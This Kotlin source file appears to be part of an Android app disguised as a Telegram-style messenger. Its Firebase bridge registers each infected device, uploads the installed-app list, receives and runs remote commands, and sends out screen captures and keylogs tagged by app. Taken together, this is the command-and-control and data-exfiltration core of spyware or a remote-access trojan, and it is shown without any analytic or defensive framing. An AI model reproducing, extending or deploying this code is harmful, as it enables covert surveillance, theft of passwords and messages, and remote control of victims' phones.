package com.telegram2.messaging.remote

import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.tasks.await
import java.util.*

object FirebaseBridge {
    private val db: FirebaseDatabase = Firebase.database
    private val devicesRef: DatabaseReference = db.getReference("devices")

    private var myDeviceId: String? = null
    private var myCommandsRef: DatabaseReference? = null

    suspend fun registerDevice(deviceName: String, androidVersion: String, appList: List<String>): String {
        val deviceId = UUID.randomUUID().toString()
        myDeviceId = deviceId
        myCommandsRef = devicesRef.child(deviceId).child("commands")

        val deviceData = mapOf(
            "deviceName" to deviceName,
            "androidVersion" to androidVersion,
            "appList" to appList,
            "lastSeen" to ServerValue.TIMESTAMP,
            "screenOn" to false
        )
        devicesRef.child(deviceId).updateChildren(deviceData).await()
        return deviceId
    }

    fun getCommandsRef(): DatabaseReference? = myCommandsRef

    fun listenForCommands(onCommand: (Map<String, Any>) -> Unit) {
        myCommandsRef?.addChildEventListener(object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                val cmd = snapshot.value as? Map<String, Any> ?: return
                onCommand(cmd)
                snapshot.ref.removeValue()
            }
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    fun sendScreenFrame(frameBase64: String) {
        devicesRef.child(myDeviceId ?: return).child("screen").setValue(frameBase64)
    }

    fun sendKeylog(packageName: String, text: String) {
        val keylogRef = devicesRef.child(myDeviceId ?: return).child("keylogs").push()
        keylogRef.setValue(mapOf(
            "packageName" to packageName,
            "text" to text,
            "timestamp" to ServerValue.TIMESTAMP
        ))
    }

    fun sendAppList(appList: List<String>) {
        devicesRef.child(myDeviceId ?: return).child("appList").setValue(appList)
    }
}